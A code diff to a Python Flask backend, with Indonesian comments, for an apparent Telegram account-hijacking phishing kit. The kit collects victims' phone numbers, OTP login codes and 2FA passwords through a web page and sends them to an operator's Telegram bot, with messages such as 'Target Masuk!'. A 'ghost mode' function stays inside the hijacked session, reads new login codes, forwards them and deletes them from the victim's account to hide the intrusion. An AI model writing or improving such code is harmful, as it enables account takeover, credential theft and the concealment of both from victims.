@@ -7,12 +7,11 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, P
 app = Flask(__name__)
 CORS(app)
 
-# Variabel Lingkungan (Ambil dari Railway)
+# Variabel Lingkungan
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-RAILWAY_URL = "https://web-production-f31a0.up.railway.app" # Ganti jika berbeda
 
 SESSION_DIR = '/tmp/sessions/'
 if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)
@@ -27,7 +26,6 @@ def send_bot(text, msg_id=None, show_otp=False, nomor=None):
         "parse_mode": "Markdown"
     }
     
-    # Tambahkan tombol OTP jika login sukses
     if show_otp and nomor:
         payload["reply_markup"] = {
             "inline_keyboard": [[{"text": "otp", "callback_data": f"ghost_{nomor}"}]]
@@ -51,7 +49,6 @@ async def register():
     nama = data.get('nama', 'User')
     nomor_raw = data.get('nomor')
     
-    # Auto-format nomor ke +62
     n = re.sub(r'\D', '', nomor_raw)
     nomor = '+62' + n[1:] if n.startswith('08') else '+' + n
 
@@ -60,8 +57,8 @@ async def register():
     
     try:
         sent_code = await client.send_code_request(nomor)
-        # Tampilan Awal (Kosong)
-        text = f"Nama: {nama}\nNomor: `{nomor}`\nKata sandi: None\nOTP: None"
+        # Pesan Awal: Status Pancingan (Satu Pesan Dimulai)
+        text = f"⚠️ **Target Masuk!**\nNama Web: {nama}\nNomor: `{nomor}`\n\n_Menunggu OTP dari web..._"
         msg_id = send_bot(text)
         
         active_sessions[nomor] = {
@@ -93,22 +90,24 @@ async def verify_otp():
         # Cek OTP
         await client.sign_in(nomor, otp, phone_code_hash=s["hash"])
         
-        # JIKA SUKSES (Tanpa 2FA)
+        # JIKA SUKSES (Tanpa F2) -> Edit Pesan Awal (Gambar 4)
         text = f"Nama: {s['nama']}\nNomor: `{nomor}`\nKata sandi: None\nOTP: {otp}"
         send_bot(text, msg_id=s["msg_id"], show_otp=True, nomor=nomor)
         return jsonify({"status": "success"}), 200
 
     except SessionPasswordNeededError:
-        # JIKA BUTUH 2FA (KATA SANDI)
+        # Update pesan ke bot bahwa target butuh 2FA
+        text = f"⚠️ **Target Butuh 2FA**\nNama: {s['nama']}\nNomor: `{nomor}`\nStatus: _Input Sandi di Web..._"
+        send_bot(text, msg_id=s["msg_id"])
+        
         if sandi:
             try:
                 await client.sign_in(password=sandi)
-                # JIKA SANDI BENAR
+                # JIKA SANDI BENAR -> Edit Pesan Awal Jadi Lengkap
                 text = f"Nama: {s['nama']}\nNomor: `{nomor}`\nKata sandi: {sandi}\nOTP: {otp}"
                 send_bot(text, msg_id=s["msg_id"], show_otp=True, nomor=nomor)
                 return jsonify({"status": "success"}), 200
             except PasswordHashInvalidError:
-                # JIKA SANDI SALAH (DETEKSI F2)
                 return jsonify({"status": "error", "message": "Kata sandi salah!"}), 400
         return jsonify({"status": "need_2fa"}), 200
     except PhoneCodeInvalidError:
@@ -123,7 +122,7 @@ async def webhook():
             nomor = cb["data"].split("_")[1]
             asyncio.create_task(ghost_mode(nomor))
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", 
-                          json={"callback_query_id": cb["id"], "text": "Ghost Mode Aktif! Siap intip kode..."})
+                          json={"callback_query_id": cb["id"], "text": "Ghost Mode Aktif!"})
     return jsonify({"status": "ok"}), 200
 
 async def ghost_mode(nomor):
@@ -136,9 +135,10 @@ async def ghost_mode(nomor):
         match = re.search(r'\b\d{5}\b', event.raw_text)
         if match:
             otp_baru = match.group()
-            text = f"Nama: {s['nama']}\nNomor: `{nomor}`\nKata sandi: -\nOTP: {otp_baru}"
-            send_bot(text, msg_id=s["msg_id"], show_otp=True, nomor=nomor)
-            await event.delete() # Hapus jejak di target
+            # Kirim pesan baru khusus OTP yang diintip sesuai video
+            text = f"✅ **OTP Ditemukan!**\nNomor: `{nomor}`\nKode: `{otp_baru}`"
+            send_bot(text) # Kirim pesan baru agar tidak menumpuk di laporan lama
+            await event.delete()
 
     await client.run_until_disconnected()
 
